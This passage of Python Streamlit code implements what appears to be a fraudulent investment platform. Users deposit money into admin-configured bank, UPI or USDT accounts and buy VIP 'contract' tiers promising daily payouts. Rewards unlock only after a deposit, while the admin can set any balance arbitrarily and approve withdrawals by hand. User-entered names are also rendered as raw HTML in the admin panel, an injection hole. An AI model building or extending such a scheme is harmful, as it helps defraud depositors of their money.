    # --- 9A. ADMINISTRATIVE CONTROL CENTRAL OVERSEER PANELS ---
    # --------------------------------------------------------------------------
    if st.session_state.is_admin:
        st.markdown("<h4 style='color:#ffffff; text-align:center;'>ADMIN CONTROL INTERFACE</h4>", unsafe_allow_html=True)
        
        if st.session_state.selected_panel == "Pending Requests":
            pending_items = query_db("SELECT id, username, bank, name, trx_id, amount, country FROM deposits WHERE status='Pending'")
            if not pending_items: st.info("Verification queue is clear.")
            else:
                for item in pending_items:
                    st.markdown(f"""
                    <div style='background-color:#05070b; padding:18px; border-radius:14px; border:1px solid #ffd700; margin-bottom:12px;'>
                        <div style="font-weight:700; color:#ffd700; margin-bottom:6px;">USER FUND DEPOSIT PACKET RECORD</div>
                        <b>User Account:</b> {item[1]}<br>
                        <b>Country Region:</b> <span style='color:#e53e3e; font-weight:700;'>{item[6]}</span><br>
                        <b>Bank Selected:</b> {item[2]}<br>
                        <b>Sender Name:</b> {item[3]}<br>
                        <b>Receipt TXID ID:</b> <code>{item[4]}</code><br>
                        <hr style='margin:8px 0; border-color:#2d3748;'>
                        AMOUNT TO CREDIT: <b style='color:#ffffff; font-size:18px;'>{item[5]:.2f}</b>
                    </div>
                    """, unsafe_allow_html=True)
                    b1, b2 = st.columns(2)
                    with b1:
                        if st.button("APPROVE TRANSACTION", key=f"a_{item[0]}"):
                            query_db("UPDATE users SET balance = balance + ? WHERE username=?", (item[5], item[1]), commit=True)
                            query_db("UPDATE deposits SET status='Approved' WHERE id=?", (item[0],), commit=True)
                            st.rerun()
                    with b2:
                        if st.button("REJECT LOG TRANSACTION", key=f"r_{item[0]}"):
                            query_db("UPDATE deposits SET status='Rejected' WHERE id=?", (item[0],), commit=True)
                            st.rerun()
                            
        elif st.session_state.selected_panel == "Regional Settings Board":
            st.markdown("##### MULTI REGIONAL BANK INSTRUCTIONS CONFIGURATION CONSOLE")
            for country_name in SUPPORTED_COUNTRIES.keys():
                st.markdown(f"<h6 style='color:#dfb01a; font-weight:700; margin-top:15px;'><b>{country_name.upper()} SYSTEM DATA GATEWAY</b></h6>", unsafe_allow_html=True)
                bank_data = query_db("SELECT bank_name, account_title, account_number FROM regional_banks WHERE country=?", (country_name,), one=True)
                b_name_val = bank_data[0] if bank_data else ""
                b_title_val = bank_data[1] if bank_data else ""
                b_num_val = bank_data[2] if bank_data else ""
                
                new_b_name = st.text_input(f"Institution Route Name Vendor ({country_name}):", value=b_name_val, key=f"adm_bname_{country_name}")
                new_b_title = st.text_input(f"Legal Statement Account Title ({country_name}):", value=b_title_val, key=f"adm_btitle_{country_name}")
                new_b_num = st.text_input(f"Core Terminal Number Code Destination String ({country_name}):", value=b_num_val, key=f"adm_bnum_{country_name}")
                
                if st.button(f"Save Mapping Details For {country_name}", key=f"save_bank_btn_{country_name}"):
                    query_db("INSERT OR REPLACE INTO regional_banks VALUES (?, ?, ?, ?)", (country_name, new_b_name.strip(), new_b_title.strip(), new_b_num.strip()), commit=True)
                    st.rerun()
                    
            st.markdown("<hr style='border-color:#2d3748;'>", unsafe_allow_html=True)
            new_ann = st.text_area("Live System Text Banner Announcement Content:", value=announcement_text, key=f"adm_ann_txt")
            new_usdt = st.text_input("USDT Core System Secure Wallet String Account:", value=usdt_address, key=f"adm_usdt_txt")
            
            if st.button("SAVE METRIC CONSOLE ADJUSTMENTS", use_container_width=True, key="save_admin_config_btn"):
                query_db("UPDATE system_config SET value=? WHERE key='system_announcement'", (new_ann.strip(),), commit=True)
                query_db("UPDATE system_config SET value=? WHERE key='usdt_address'", (new_usdt.strip(),), commit=True)
                st.rerun()
                
        elif st.session_state.selected_panel == "User Identity Adjustments Module":
            st.markdown("##### USER PROFILE RESERVES LEDGER ADJUSTMENT PROTOCOLS")
            target_user = st.text_input("Target Email Account Verification String:", key="adm_target_user_input")
            if target_user.strip():
                user_res = query_db("SELECT balance, selected_country FROM users WHERE username=?", (target_user.strip(),), one=True)
                if user_res:
                    st.markdown(f"<div class='announcement-box'>Available Balance Parameter: <b>{user_res[0]:.2f}</b></div>", unsafe_allow_html=True)
                    new_balance = st.number_input("Assign New Balance Value to User Space Cell:", min_value=0.0, value=float(user_res[0]), key="adm_new_bal_input")
                    if st.button("EXECUTE FORCED METRICS DATA WRITE NOW", use_container_width=True, key="adm_save_user_bal_btn"):
                        query_db("UPDATE users SET balance=? WHERE username=?", (new_balance, target_user.strip()), commit=True)
                        st.rerun()
                else: st.error("No profile matches that user space variable record.")
                    
        elif st.session_state.selected_panel == "Admin Liquidation Settlements":
            st.markdown("##### OUTBOUND CASHOUT EXTRACTIONS QUEUES DISPATCH SECTIONS")
            pending_with = query_db("SELECT id, username, bank, account, amount, country FROM withdrawals WHERE status='Pending'")
            if not pending_with: st.info("Outbound liquidation pipelines run flat clear.")
            else:
                for w_item in pending_with:
                    st.markdown(f"<div style='background:#05070b; border:1px solid #2d3748; padding:12px; border-radius:12px;'>User Target: {w_item[1]} | Bank Provider: {w_item[2]} | Account Route: {w_item[3]} | Volume Scale: {w_item[4]}</div>", unsafe_allow_html=True)
                    wb1, wb2 = st.columns(2)
                    with wb1:
                        if st.button("APPROVE OUTBOUND SETTLEMENT WIRE", key=f"w_app_{w_item[0]}"):
                            query_db("UPDATE withdrawals SET status='Approved' WHERE id=?", (w_item[0],), commit=True)
                            st.rerun()
                    with wb2:
                        if st.button("REJECT EXTRACTION AND REFUND ASSET", key=f"w_rej_{w_item[0]}"):
                            query_db("UPDATE users SET balance = balance + ? WHERE username=?", (w_item[4], w_item[1]), commit=True)
                            query_db("UPDATE withdrawals SET status='Rejected' WHERE id=?", (w_item[0],), commit=True)
                            st.rerun()
                            
        st.markdown("<hr style='border-color:#2d3748;'>", unsafe_allow_html=True)
        ad_c1, ad_c2, ad_c3, ad_c4 = st.columns(4)
        with ad_c1:
            if st.button("DEPOSITS QUEUE", key="adm_bottom_nav_deps"): st.session_state.selected_panel = "Pending Requests"; st.rerun()
        with ad_c2:
            if st.button("REGIONAL CONFIG CORE", key="adm_bottom_nav_master"): st.session_state.selected_panel = "Regional Settings Board"; st.rerun()
        with ad_c3:
            if st.button("USER VAULT CENTER", key="adm_bottom_nav_userbal"): st.session_state.selected_panel = "User Identity Adjustments Module"; st.rerun()
        with ad_c4:
            if st.button("OUTBOUND RECONCILIATION", key="adm_bottom_nav_with"): st.session_state.selected_panel = "Admin Liquidation Settlements"; st.rerun()

        st.markdown("<hr style='border-color:#e53e3e; opacity:0.4;'>", unsafe_allow_html=True)
        if st.button("LOG OUT", key="adm_single_forced_logout_trigger", use_container_width=True):
            st.session_state.logged_in = False
            st.query_params.clear()
            st.rerun()

    # --------------------------------------------------------------------------
    # --- 9B. DYNAMIC USER SECURE WORKSPACE SESSIONS ---
    # --------------------------------------------------------------------------
    else:
        user_metrics = query_db("SELECT balance, liquidation, active_level, ref_code, selected_country FROM users WHERE username=?", (st.session_state.current_user,), one=True)
        wallet_bal, liquid_bal, level_tag, reference_hash, saved_user_country = user_metrics if user_metrics else (0.00, 0.00, 'SVIP LEVEL 1', 'Y999', 'India')
        
        if not saved_user_country or saved_user_country == "Pakistan": saved_user_country = "India"
        st.session_state.user_country = saved_user_country
        
        country_meta = SUPPORTED_COUNTRIES.get(st.session_state.user_country, {"currency": "INR", "symbol": "₹", "banks": ["UPI Gateway"]})
        currency_str = country_meta["currency"]
        symbol_str = country_meta["symbol"]
        available_banks_list = country_meta["banks"]
        
        has_approved_deposit = query_db("SELECT id FROM deposits WHERE username=? AND status='Approved'", (st.session_state.current_user,), one=True)
        
        # --- HIGHLIGHTED COUNTRY SELECTOR BORDER INTERFACE (DASHBOARD CENTER) ---
        st.markdown('<div class="highlight-country-selector-box"><div class="highlight-country-label">🌍 SELECT YOUR ACTIVE COUNTRY REGION</div>', unsafe_allow_html=True)
        country_options_list = list(SUPPORTED_COUNTRIES.keys())
        try: mapped_selection_index = country_options_list.index(st.session_state.user_country)
        except ValueError: mapped_selection_index = 0
            
        chosen_cntry_opt = st.selectbox(
            "Active Country:", 
            options=country_options_list, 
            index=mapped_selection_index, 
            key="usr_dashboard_country_select",
            label_visibility="collapsed"
        )
        st.markdown('</div>', unsafe_allow_html=True)
        
        if chosen_cntry_opt != st.session_state.user_country:
            query_db("UPDATE users SET selected_country=? WHERE username=?", (chosen_cntry_opt, st.session_state.current_user), commit=True)
            st.session_state.user_country = chosen_cntry_opt
            st.rerun()
                
        if st.session_state.selected_panel == "Overview":
            grid_col1, grid_col2 = st.columns(2)
            with grid_col1:
                st.markdown(f'<div class="app-grid-coral"><small>Your Total Balance</small><h4>{symbol_str} {wallet_bal:,.2f}</h4></div>', unsafe_allow_html=True)
            with grid_col2:
                st.markdown(f'<div class="app-grid-purple"><small>Current Contract Rank Tier</small><h4>{level_tag}</h4></div>', unsafe_allow_html=True)

            # --- INVESTMENT LEVELS GRID & MANUAL BUY INTERFACE ---
            st.markdown("<p style='font-size:14px; font-weight:700; color:#dfb01a; text-align:center; text-transform:uppercase; margin-top:20px;'>Investment Contract Packages</p>", unsafe_allow_html=True)
            for tier_name, d in VIP_LEVELS.items():
                col_t1, col_t2, col_t3 = st.columns([2, 2, 1])
                with col_t1:
                    st.markdown(f"<div style='padding:5px; font-weight:700; color:#ffffff;'>{tier_name}</div>", unsafe_allow_html=True)
                with col_t2:
                    st.markdown(f"<div style='padding:5px; color:#dfb01a;'>Req: {symbol_str} {d['price']:.2f} | Daily: {symbol_str} {d['ad_pay']:.2f}</div>", unsafe_allow_html=True)
                with col_t3:
                    if level_tag == tier_name:
                        st.markdown("<span style='color:#28a745; font-weight:700; font-size:12px;'>ACTIVE</span>", unsafe_allow_html=True)
                    else:
                        if st.button("BUY", key=f"buy_btn_action_{tier_name}"):
                            if wallet_bal >= d['price']:
                                query_db("UPDATE users SET active_level=? WHERE username=?", (tier_name, st.session_state.current_user), commit=True)
                                st.success(f"Successfully activated {tier_name} contract!")
                                st.rerun()
                            else:
                                st.error("Insufficient balance parameters.")
            
            # --- FULL LUCKY WHEEL CANVAS INTERFACE ANIMATOR ---
            st.markdown("<p style='font-family:\"Inter\"; font-weight:700; font-size:14px; color:#dfb01a; text-align:center; margin-top:20px;'>LUCKY SPIN WHEEL WINNING SLOTS</p>", unsafe_allow_html=True)
            today_date = time.strftime("%Y-%m-%d")
            already_spun = query_db("SELECT username FROM lucky_spins WHERE username=? AND date=?", (st.session_state.current_user, today_date), one=True)
            
            if already_spun: st.markdown("<div style='color:#e53e3e; font-weight:bold; text-align:center; font-size:13px; padding:10px;'>Spin option completely used for today.</div>", unsafe_allow_html=True)
            else:
                wheel_prizes = [0.50, 2.00, 0.10, 5.00, 0.20, 10.00, 1.50, 0.00]
                if 'wheel_triggered' not in st.session_state: st.session_state.wheel_triggered = False
                    
                if not st.session_state.wheel_triggered:
                    if st.button("TRIGGER CASINO WHEEL ROTATION", use_container_width=True, key="trigger_wheel_btn"):
                        st.session_state.wheel_triggered = True
                        st.session_state.chosen_prize_idx = random.randint(0, 7)
                        st.rerun()
                else:
                    win_amt = wheel_prizes[st.session_state.chosen_prize_idx]
                    target_rotation = 360 * 5 + (360 - (st.session_state.chosen_prize_idx * 45))
                    wheel_html = f"""
                    <div style="text-align:center; background:#0b1426; padding:15px; border-radius:8px; border:1px solid #1c325c;">
                        <canvas id="wheelCanvas" width="260" height="260" style="border:2px solid #1c325c; border-radius:50%; background:#0c1833; transition: transform 4s cubic-bezier(0.1, 0.8, 0.3, 1);"></canvas>
                        <script>
                            const ctx = document.getElementById('wheelCanvas').getContext('2d');
                            const labels = ["{symbol_str}0.50", "{symbol_str}2.00", "{symbol_str}0.10", "{symbol_str}5.00", "{symbol_str}0.20", "{symbol_str}10.00", "{symbol_str}1.50", "VOID"];
                            const colors = ["#bd2a2a", "#0c1833", "#00b5d8", "#0c1833", "#6366f1", "#0c1833", "#dd6b20", "#0c1833"];
                            for (let i = 0; i < 8; i++) {{
                                ctx.beginPath(); ctx.fillStyle = colors[i]; ctx.moveTo(130, 130);
                                ctx.arc(130, 130, 130, (i*45)*Math.PI/180, ((i+1)*45)*Math.PI/180); ctx.lineTo(130, 130); ctx.fill();
                                ctx.save(); ctx.translate(130, 130); ctx.rotate((i*45+22.5)*Math.PI/180);
                                ctx.fillStyle = '#ffffff'; ctx.font = "600 12px Inter"; ctx.fillText(labels[i], 45, 5); ctx.restore();
                            }}
                            setTimeout(() => {{ document.getElementById('wheelCanvas').style.transform = 'rotate({target_rotation}deg)'; }}, 300);
                        </script>
                    </div>
                    """
                    components.html(wheel_html, height=300)
                    if st.button("CLAIM ALLOCATED SPIN REWARD UNITS NOW", use_container_width=True, key="claim_wheel_reward_btn"):
                        query_db("INSERT INTO lucky_spins VALUES (?, ?, ?)", (st.session_state.current_user, today_date, win_amt), commit=True)
                        query_db("UPDATE users SET balance = balance + ? WHERE username=?", (win_amt, st.session_state.current_user), commit=True)
                        st.session_state.wheel_triggered = False
                        st.rerun()
                        
            st.markdown("<hr style='border-color:#1c325c;'>", unsafe_allow_html=True)
            
            # --- DAILY ATTENDANCE SYSTEMS ---
            already_checked = query_db("SELECT username FROM checkins WHERE username=? AND date=?", (st.session_state.current_user, today_date), one=True)
            st.markdown("<p style='font-family:\"Inter\"; font-weight:700; font-size:14px; color:#ffffff;'>Daily Login Attendance Claim</p>", unsafe_allow_html=True)
            
            if not has_approved_deposit:
                st.markdown("<div class='announcement-box' style='color:#e53e3e !important; border:1px solid #e53e3e;'>ACCOUNT UNVERIFIED: One confirmed deposit required before unlocking daily rewards.</div>", unsafe_allow_html=True)
            else:
                if already_checked: st.markdown("<p style='color:#00b5d8; font-weight:700; font-size:14px; text-align:center;'>DAILY REWARD REGISTER VALUE CONFIRMED ALIGNED FOR TODAY</p>", unsafe_allow_html=True)
                else:
                    if st.button("CLAIM DAILY ATTENDANCE LOGIN REWARD NOW", key="claim_bonus", use_container_width=True):
                        query_db("INSERT INTO checkins VALUES (?, ?)", (st.session_state.current_user, today_date), commit=True)
                        query_db("UPDATE users SET balance = balance + 0.50 WHERE username=?", (st.session_state.current_user,), commit=True)
                        st.rerun()

        elif st.session_state.selected_panel == "Deposit":
            st.markdown(f"<h5>DEPOSIT METHOD GATEWAY ({st.session_state.user_country.upper()})</h5>", unsafe_allow_html=True)
            selected_method = st.selectbox("Select Deposit Bank Method:", options=available_banks_list, key="usr_mega888_deposit_selector")
            
            country_details = country_meta.get("details", {})
            method_node_data = country_details.get(selected_method, {"title": "Global Matrix Assigned Node Broker", "num": "Unavailable Parameter Space"})
            assigned_title_holder = method_node_data["title"]
            assigned_numerical_route = method_node_data["num"]
            
            st.markdown(f"""
            <div class="premium-bank-detail-card">
                <div style="color:#dfb01a; font-size:12px; font-weight:700; margin-bottom:10px; text-transform:uppercase;">Verified Destination Details</div>
                <div class="bank-line-row"><span class="bank-line-label">Selected Pathway:</span><span class="bank-line-value" style="color:#28a745;">{selected_method}</span></div>
                <div class="bank-line-row"><span class="bank-line-label">Account Title Name:</span><span class="bank-line-value">{assigned_title_holder}</span></div>
                <div class="bank-line-row" style="border-bottom:none; padding-bottom:0;"><span class="bank-line-label">Account / UPI Line:</span><span class="bank-line-value" style="color:#dfb01a; user-select:all; cursor:pointer;">{assigned_numerical_route}</span></div>
            </div>
            """, unsafe_allow_html=True)
            
            remitter_name = st.text_input("Your Name:", placeholder="Enter sender account title name", key="usr_deposit_name_input")
            trx_id_input = st.text_input("Transaction ID:", placeholder="Enter transaction receipt TXID hash", key="usr_deposit_trx_input")
            amount_input = st.number_input(f"Amount Value ({currency_str}):", min_value=1.0, value=100.0, key="usr_deposit_amt_input")
            
            if st.button("SUBMIT TRANSACTION DEPOSIT PACKETS", use_container_width=True, key="usr_submit_deposit_proof_btn"):
                if remitter_name.strip() and trx_id_input.strip():
                    query_db("INSERT INTO deposits (username, bank, name, trx_id, amount, status, country) VALUES (?, ?, ?, ?, ?, 'Pending', ?)", 
                             (st.session_state.current_user, selected_method, remitter_name.strip(), trx_id_input.strip(), amount_input, st.session_state.user_country), commit=True)
                    st.success("Transaction data logged safely under verification nodes.")
                else: st.error("Error: Input fields cannot be blank.")
                    
        elif st.session_state.selected_panel == "Cashout":
            st.markdown(f"<h5>WITHDRAW PANEL ({st.session_state.user_country.upper()})</h5>", unsafe_allow_html=True)
            selected_withdraw_method = st.selectbox("Select Withdrawal Route:", options=available_banks_list, key="usr_mega888_withdraw_selector")
            account_route = st.text_input("Account Number:", placeholder="Enter destination numeric account digits/UPI line code", key="usr_withdraw_acc_input")
            amount_input = st.number_input(f"Withdraw Amount ({currency_str}):", min_value=10.0, key="usr_withdraw_amt_input")
            
            if st.button("INITIALIZE CASHOUT REQUEST", use_container_width=True, key="usr_submit_withdraw_btn"):
                if wallet_bal >= amount_input:
                    query_db("UPDATE users SET balance = balance - ? WHERE username=?", (amount_input, st.session_state.current_user), commit=True)
                    query_db("INSERT INTO withdrawals (username, bank, account, amount, status, country) VALUES (?, ?, ?, ?, 'Pending', ?)", 
                             (st.session_state.current_user, selected_withdraw_method, account_route.strip(), amount_input, st.session_state.user_country), commit=True)
                    st.success("Extraction records compiled securely.")
                    st.rerun()
                else: st.error("Error: Account available balance parameters fail validation checks limits.")
                    
        elif st.session_state.selected_panel == "Promote_Video":
            st.markdown("<h5>ADVERTISING MANAGER PORTAL</h5>", unsafe_allow_html=True)
            adv_email = st.text_input("Advertiser Email:", value=st.session_state.current_user, key="usr_promo_email_input")
            video_url = st.text_input("Youtube Target URL String Link:", placeholder="https://www.youtube.com/watch?v=...", key="usr_promo_url_input")
            views_req = st.number_input("Required Impressions View Limit Count:", min_value=100, step=100, value=100, key="usr_promo_views_input")
            total_cost = views_req * 0.10
            st.info(f"Total Campaign Cost Metric Evaluation: **{symbol_str} {total_cost:.2f}**")
            payment_trx = st.text_input("Enter Wire Payment Receipt TXID Hash Key String:", key="usr_promo_trx_input")
            
            if st.button("DEPLOY ADVERTISING CAMPAIGN", use_container_width=True, key="usr_submit_promo_btn"):
                if adv_email.strip() and video_url.strip() and payment_trx.strip():
                    query_
